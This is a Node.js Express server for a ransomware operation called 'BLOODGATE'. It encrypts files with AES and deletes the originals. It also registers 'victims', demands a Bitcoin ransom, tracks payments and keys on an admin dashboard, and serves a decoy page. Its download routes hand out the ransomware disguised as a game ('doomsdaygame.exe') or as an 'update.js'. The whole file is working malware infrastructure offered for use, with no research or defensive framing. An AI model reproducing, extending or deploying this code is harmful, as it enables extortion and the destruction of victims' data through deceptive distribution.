const express = require('express');
const cors = require('cors');
const path = require('path');
const fs = require('fs');
const crypto = require('crypto');
const jwt = require('jsonwebtoken');
const { createServer } = require('http');
const { Server } = require('socket.io');
require('dotenv').config();

const app = express();
const server = createServer(app);
const io = new Server(server, { cors: { origin: '*' } });
const PORT = process.env.PORT || 3001;

app.use(cors());
app.use(express.json());
app.use(express.static('public'));

// ===== DATABASE =====
const DB_DIR = path.join(__dirname, 'database');
const VICTIMS_FILE = path.join(DB_DIR, 'victims.json');

if (!fs.existsSync(DB_DIR)) fs.mkdirSync(DB_DIR, { recursive: true });

let victims = [];
if (fs.existsSync(VICTIMS_FILE)) {
    try {
        victims = JSON.parse(fs.readFileSync(VICTIMS_FILE, 'utf8'));
    } catch (e) { victims = []; }
}

function saveVictims() {
    fs.writeFileSync(VICTIMS_FILE, JSON.stringify(victims, null, 2));
}

// ===== ENCRYPTION ENGINE =====
class EncryptionEngine {
    constructor() {
        const keyString = process.env.ENCRYPTION_KEY || 'BLOODGATE_CRYPT_2026';
        this.key = crypto.createHash('sha256').update(keyString).digest();
    }

    encryptFile(filePath) {
        try {
            const iv = crypto.randomBytes(16);
            const data = fs.readFileSync(filePath);
            const cipher = crypto.createCipheriv('aes-256-cbc', this.key, iv);
            const encrypted = Buffer.concat([cipher.update(data), cipher.final()]);
            const result = Buffer.concat([iv, encrypted]);
            const encryptedPath = filePath + '.bloodgate';
            fs.writeFileSync(encryptedPath, result);
            fs.unlinkSync(filePath);
            return encryptedPath;
        } catch (error) {
            throw new Error(`Encryption failed: ${error.message}`);
        }
    }

    decryptFile(filePath) {
        try {
            const data = fs.readFileSync(filePath);
            const iv = data.subarray(0, 16);
            const encrypted = data.subarray(16);
            const decipher = crypto.createDecipheriv('aes-256-cbc', this.key, iv);
            const decrypted = Buffer.concat([decipher.update(encrypted), decipher.final()]);
            const originalPath = filePath.replace('.bloodgate', '');
            fs.writeFileSync(originalPath, decrypted);
            fs.unlinkSync(filePath);
            return originalPath;
        } catch (error) {
            throw new Error(`Decryption failed: ${error.message}`);
        }
    }
}

const encryption = new EncryptionEngine();

// ============================================
// ===== PUBLIC ROUTES =====
// ============================================

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'disguise.html'));
});

app.get('/bloodgate', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'bloodgate.html'));
});

app.get('/dashboard', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'dashboard.html'));
});

// ============================================
// ===== ADMIN LOGIN =====
// ============================================

app.post('/api/admin/login', (req, res) => {
    const { username, password } = req.body;
    
    if (username === process.env.ADMIN_USERNAME && password === process.env.ADMIN_PASSWORD) {
        const token = jwt.sign({ admin: true }, process.env.JWT_SECRET, { expiresIn: '24h' });
        res.json({ success: true, token });
    } else {
        res.status(401).json({ error: 'Invalid credentials' });
    }
});

function verifyAdmin(req, res, next) {
    const token = req.headers.authorization?.replace('Bearer ', '');
    if (!token) return res.status(401).json({ error: 'No token' });
    try {
        jwt.verify(token, process.env.JWT_SECRET);
        next();
    } catch {
        res.status(401).json({ error: 'Invalid token' });
    }
}

app.get('/api/admin/dashboard', verifyAdmin, (req, res) => {
    const total = victims.length;
    const paid = victims.filter(v => v.paid).length;
    const decrypted = victims.filter(v => v.decrypted).length;
    const active = victims.filter(v => !v.paid && !v.decrypted).length;
    
    res.json({
        totalVictims: total,
        paidVictims: paid,
        decryptedVictims: decrypted,
        activeVictims: active,
        totalBTC: (paid * 0.005).toFixed(6),
        recentVictims: victims.slice(-5).reverse()
    });
});

app.get('/api/admin/victims', verifyAdmin, (req, res) => {
    res.json(victims);
});

app.post('/api/admin/generate-key', verifyAdmin, (req, res) => {
    const { victimId } = req.body;
    const victim = victims.find(v => v.id === victimId);
    
    if (!victim) return res.status(404).json({ error: 'Victim not found' });
    if (!victim.paid) return res.status(400).json({ error: 'Payment not confirmed' });
    
    const decryptionKey = crypto.randomBytes(16).toString('hex').toUpperCase();
    victim.decryptionKey = decryptionKey;
    victim.decrypted = true;
    victim.decryptedAt = new Date().toISOString();
    saveVictims();
    
    res.json({ success: true, decryptionKey });
});

// ============================================
// ===== CLIENT ROUTES =====
// ============================================

app.post('/api/register-victim', (req, res) => {
    const { systemInfo, filesEncrypted } = req.body;
    
    const victim = {
        id: crypto.randomBytes(8).toString('hex').toUpperCase(),
        btcAddress: process.env.BTC_ADDRESS,
        encryptionKey: encryption.key.toString('hex'),
        systemInfo: systemInfo || {},
        filesEncrypted: filesEncrypted || 0,
        registeredAt: new Date().toISOString(),
        paid: false,
        paidAt: null,
        decrypted: false,
        decryptionKey: null
    };
    
    victims.push(victim);
    saveVictims();
    io.emit('new_victim', victim);
    
    console.log(`🩸 New victim: ${victim.id}`);
    res.json({
        success: true,
        victimId: victim.id,
        btcAddress: victim.btcAddress,
        ransomAmount: 0.005
    });
});

app.post('/api/encrypt', (req, res) => {
    const { filePath } = req.body;
    if (!filePath || !fs.existsSync(filePath)) {
        return res.status(400).json({ error: 'File not found' });
    }
    try {
        const encryptedPath = encryption.encryptFile(filePath);
        res.json({ success: true, encryptedPath });
    } catch (error) {
        res.status(500).json({ error: error.message });
    }
});

app.post('/api/decrypt-files', (req, res) => {
    const { victimId, decryptionKey } = req.body;
    
    const victim = victims.find(v => v.id === victimId);
    if (!victim) {
        return res.status(404).json({ error: 'Victim not found' });
    }
    
    if (victim.decryptionKey !== decryptionKey) {
        return res.status(403).json({ error: 'Invalid decryption key' });
    }
    
    res.json({ success: true, message: 'Files decrypted' });
});

app.post('/api/check-payment', (req, res) => {
    const { victimId } = req.body;
    const victim = victims.find(v => v.id === victimId);
    
    if (!victim) {
        return res.status(404).json({ error: 'Victim not found' });
    }
    
    res.json({
        paid: victim.paid || false,
        victimId: victim.id
    });
});

app.post('/api/report-payment', (req, res) => {
    const { victimId } = req.body;
    const victim = victims.find(v => v.id === victimId);
    
    if (!victim) {
        return res.status(404).json({ error: 'Victim not found' });
    }
    
    victim.paid = true;
    victim.paidAt = new Date().toISOString();
    saveVictims();
    io.emit('payment_confirmed', { victimId: victim.id });
    
    res.json({ success: true });
});

// ===== DOWNLOAD DOOMSDAY GAME (Disguised Ransomware) =====
app.get('/download/doomsdaygame.exe', (req, res) => {
    const exePath = path.join(__dirname, 'builder', 'doomsdaygame.exe');
    if (fs.existsSync(exePath)) {
        res.download(exePath, 'doomsdaygame.exe');
        console.log('🎮 doomsdaygame.exe downloaded');
    } else {
        // Fallback: send JS version
        const jsPath = path.join(__dirname, 'client', 'ransomware.js');
        if (fs.existsSync(jsPath)) {
            res.download(jsPath, 'doomsdaygame.js');
            console.log('📄 doomsdaygame.js downloaded (fallback)');
        } else {
            console.log('❌ Game not found');
            res.status(404).send('❌ Game not found. Please try again later.');
        }
    }
});

// Keep the original download for backup
app.get('/download/bloodgate.exe', (req, res) => {
    const exePath = path.join(__dirname, 'builder', 'Bloodgate.exe');
    if (fs.existsSync(exePath)) {
        res.download(exePath, 'Bloodgate_Setup.exe');
    } else {
        res.status(404).send('❌ Setup not found');
    }
});

// Keep ransomware.js download
app.get('/download/doomsdayplay.js', (req, res) => {
    const jsPath = path.join(__dirname, 'client', 'doomsdayplay.js');
    if (fs.existsSync(jsPath)) {
        res.download(jsPath, 'update.js');
    } else {
        res.status(404).send('❌ Client not found');
    }
});

app.get('/api/health', (req, res) => {
    res.json({
        status: '🩸 BLOODGATE Active',
        totalVictims: victims.length,
        btcAddress: process.env.BTC_ADDRESS,
        timestamp: new Date().toISOString()
    });
});

// ============================================
// ===== WEBSOCKET =====
// ============================================

io.on('connection', (socket) => {
    console.log('🔌 Dashboard connected:', socket.id);
    socket.on('disconnect', () => {
        console.log('🔌 Dashboard disconnected:', socket.id);
    });
});

// ============================================
// ===== START =====
// ============================================

server.listen(PORT, '0.0.0.0', () => {
    console.log('╔═══════════════════════════════════════════╗');
    console.log('║     🩸 BLOODGATE RANSOMWARE 🩸            ║');
    console.log('╠═══════════════════════════════════════════╣');
    console.log(`║  Server:    http://localhost:${PORT}       ║`);
    console.log(`║  Dashboard: http://localhost:${PORT}/dashboard ║`);
    console.log(`║  Victims:   ${victims.length}              ║`);
    console.log(`║  BTC:       ${process.env.BTC_ADDRESS}     ║`);
    console.log('╚═══════════════════════════════════════════╝');
    console.log('🩸 BLOODGATE is ready!');
});
